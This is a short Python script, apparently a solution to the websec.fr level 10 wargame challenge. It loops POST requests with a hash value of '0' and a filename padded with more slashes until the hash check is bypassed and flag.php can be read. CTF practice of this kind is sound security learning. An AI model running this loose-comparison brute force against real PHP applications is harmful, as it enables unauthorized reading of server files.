import requests

url = "https://websec.fr:443/level10/index.php"
filename = "./flag.php"
i = 1

while True:

    data = {
            "f": filename, 
            "hash": "0"
        }

    r = requests.post(url, data=data)
    if "Permission denied!" in r.text:
        filename = "." + "/" * i + "flag.php"
        i+=1
        pass

    else:
        print("[!] Filname : " + filename)
        break

